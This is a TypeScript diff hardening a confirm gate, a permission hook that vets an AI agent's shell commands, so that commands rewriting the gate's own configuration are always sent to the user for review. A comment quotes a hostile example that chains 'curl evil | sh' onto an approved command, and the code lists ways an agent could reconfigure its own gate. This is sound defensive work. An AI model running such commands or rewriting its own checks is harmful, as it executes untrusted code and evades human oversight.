@@ -141,6 +141,13 @@ export function wildcardSpans(command: string, pattern: string): string[] | null
  * registration approved (e.g. `gh issue comment 7; curl evil | sh` under a
  * `gh issue comment *` registration).
  */
+// Decision, not accident: plain `>` / `<` redirection is deliberately NOT in
+// this set. A redirect inside a wildcard span writes a local file — it does
+// not chain or spawn a second command — and `>` shows up routinely in quoted
+// prose (markdown blockquotes, arrows) that comment-style writes carry, so
+// including it would downgrade most legitimate `auto` comments to prompts.
+// Redirections aimed at the gate's own config files are handled separately
+// and unconditionally by `detectSelfGatingWrite` below.
 const SHELL_CONTROL = /[;&|`\n]|\$\(|<\(|>\(/;
 
 /**
@@ -153,6 +160,89 @@ const SHELL_CONTROL = /[;&|`\n]|\$\(|<\(|>\(/;
 export function autoAllowIsUnsafe(command: string, pattern: string): boolean {
   const spans = wildcardSpans(command, pattern);
   return spans !== null && spans.some((s) => SHELL_CONTROL.test(s));
+}
+
+/**
+ * Self-gating protection — the gate's own configuration is not allowed to
+ * be reconfigured or rewritten by an ungated Bash command.
+ *
+ * Two families of spellings are detected, ahead of normal pattern matching:
+ *
+ *   (a) `rubber-ducky settings set confirm.<service>.<verb> …` — the CLI
+ *       verb that flips a confirm policy (e.g. to `auto`).
+ *   (b) Common Bash writes onto the gate's two config files —
+ *       `.rubber-ducky/write-patterns` and the vault `settings.json`:
+ *       `>` / `>>` redirection targets, `tee`, and `cp` / `mv` onto the
+ *       paths.
+ *
+ * A hit always returns a preview-style "ask" — never auto-approved, and not
+ * configurable via any policy. This cannot be watertight (shell spellings
+ * are unbounded); the goal is raising the cost of self-reconfiguration from
+ * innocuous-looking to visibly evasive. The legitimate path still works:
+ * `settings set confirm.*` executes normally once the user approves the
+ * prompt.
+ *
+ * Note: matching `settings.json` by basename means writes to OTHER
+ * settings.json files (e.g. `.vscode/settings.json`) inside a vault also
+ * prompt. Accepted: the cost of a false positive is one visible dialog.
+ */
+export function detectSelfGatingWrite(command: string): string | null {
+  // (a) settings set with a confirm.* key, allowing global flags between
+  // the binary name and the verb. `[^\n;|&]*` keeps the match within one
+  // simple command so `echo done; rubber-ducky settings set confirm…`
+  // still hits via the second simple command's own scan.
+  if (/(^|[\s;|&(])(\S*rubber-ducky|bun\s+\S*cli\.ts)\b[^\n;|&]*\bsettings\s+set\s+["']?confirm\./.test(command)) {
+    return "settings set confirm.*";
+  }
+
+  // (b) Bash-level writes onto the gate's config files.
+  // Separate redirection operators that are glued to their target
+  // (`>>file`, `2>file`) so they tokenize cleanly.
+  const spaced = command.replace(/(\d?>{1,2}\|?)/g, " $1 ");
+  const tokens = spaced.split(/\s+/).filter((t) => t.length > 0);
+
+  const isRedirect = (t: string) => /^\d?>{1,2}\|?$/.test(t);
+  const isWriterCmd = (t: string) => t === "tee" || t === "cp" || t === "mv";
+  const isGateConfigPath = (raw: string): boolean => {
+    const t = raw.replace(/^["']+|["']+$/g, "");
+    if (t.includes(".rubber-ducky/write-patterns")) return true;
+    return t === "settings.json" || t === "./settings.json" || t.endsWith("/settings.json");
+  };
+
+  for (let i = 0; i < tokens.length; i++) {
+    const tok = tokens[i];
+    if (isRedirect(tok) && i + 1 < tokens.length && isGateConfigPath(tokens[i + 1])) {
+      return `redirection onto ${tokens[i + 1]}`;
+    }
+    if (isWriterCmd(tok) || tok.endsWith("/tee") || tok.endsWith("/cp") || tok.endsWith("/mv")) {
+      for (let j = i + 1; j < tokens.length; j++) {
+        // Stop the argument scan at the next command boundary.
+        if (/^[;|&]+$/.test(tokens[j]) || isRedirect(tokens[j])) break;
+        if (isGateConfigPath(tokens[j])) {
+          return `${path.basename(tok)} onto ${tokens[j]}`;
+        }
+      }
+    }
+  }
+
+  return null;
+}
+
+/**
+ * Decision for a detected self-gating write: preview-style ask, regardless
+ * of any configured policy.
+ */
+export function selfGatingDecision(command: string, what: string): GateDecision {
+  return {
+    hookSpecificOutput: {
+      hookEventName: "PreToolUse",
+      permissionDecision: "ask",
+      permissionDecisionReason:
+        `rubber-ducky confirm gate: this command modifies the confirm gate's own ` +
+        `configuration (${what}) — always previewed, never auto-approved. ` +
+        `Review before allowing: ${truncate(command, 300)}`,
+    },
+  };
 }
 
 /**
@@ -276,6 +366,12 @@ export function runConfirmGate(rawPayload: string): GateDecision | null {
     return null;
   }
   if (!workspaceRoot) return null;
+
+  // Self-gating check runs BEFORE pattern matching (and regardless of what
+  // is registered): the gate's own config must not be reconfigurable by an
+  // ungated or auto-allowed command.
+  const selfGating = detectSelfGatingWrite(command);
+  if (selfGating) return selfGatingDecision(command, selfGating);
 
   const patternsPath = path.join(workspaceRoot, WRITE_PATTERNS_RELPATH);
   let patterns: WritePattern[];
